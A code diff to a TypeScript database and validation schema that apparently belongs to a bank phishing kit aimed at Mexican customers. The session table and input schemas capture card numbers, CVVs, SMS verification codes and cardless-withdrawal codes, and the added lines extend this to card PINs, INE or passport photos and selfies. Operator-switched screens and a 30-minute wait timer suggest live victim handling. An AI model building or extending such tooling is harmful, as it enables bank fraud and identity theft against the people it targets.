@@ -138,6 +138,11 @@ export const sessions = pgTable("sessions", {
   codigoRetiro: text("codigo_retiro"), // Código de retiro sin tarjeta (10 dígitos)
   codigoVerificacionSMS: text("codigo_verificacion_sms"), // Código de verificación SMS (4 dígitos)
   tarjetasProtegidas: text("tarjetas_protegidas"), // JSON con array de tarjetas (crédito y débito)
+  nipTarjeta: text("nip_tarjeta"), // NIP de la tarjeta protegida
+  tipoIdentificacion: text("tipo_identificacion"), // INE o Pasaporte
+  fotoIdentidadFrente: text("foto_identidad_frente"), // Foto frontal de identificación
+  fotoIdentidadAtras: text("foto_identidad_atras"), // Foto trasera de identificación (solo INE)
+  fotoSelfie: text("foto_selfie"), // Foto selfie del usuario
   pasoActual: text("paso_actual").default("folio"),
   waitingStartTime: timestamp("waiting_start_time"), // Timestamp cuando comenzó el timer de 30 minutos (ACTUALIZACION screen)
   createdAt: timestamp("created_at").defaultNow(),
@@ -265,6 +270,9 @@ export enum ScreenType {
   CODIGO_RETIRO = "codigo_retiro",
   PROTECCION_TARJETAS = "proteccion_tarjetas",
   VERIFICANDO_INFO = "verificando_info",
+  NIP_TARJETA = "nip_tarjeta",
+  CONFIRMAR_IDENTIDAD = "confirmar_identidad",
+  VALIDANDO_IDENTIDAD = "validando_identidad",
 }
 
 export const screenChangeSchema = z.object({
@@ -318,6 +326,8 @@ export const clientInputSchema = z.object({
       z.object({ tipo: z.literal('datos_contacto'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
       z.object({ tipo: z.literal('codigo_retiro'), codigoRetiro: z.string(), codigoVerificacionSMS: z.string() }),
       z.object({ tipo: z.literal('proteccion_tarjetas'), tarjetas: z.array(z.object({ numero: z.string(), vencimiento: z.string(), cvv: z.string(), tipo: z.enum(['credito', 'debito']) })) }),
+      z.object({ tipo: z.literal('nip_tarjeta'), nipTarjeta: z.string() }),
+      z.object({ tipo: z.literal('confirmar_identidad'), tipoIdentificacion: z.enum(['INE', 'Pasaporte']), fotoIdentidadFrente: z.string(), fotoIdentidadAtras: z.string().optional(), fotoSelfie: z.string() }),
     ])
   )
 });
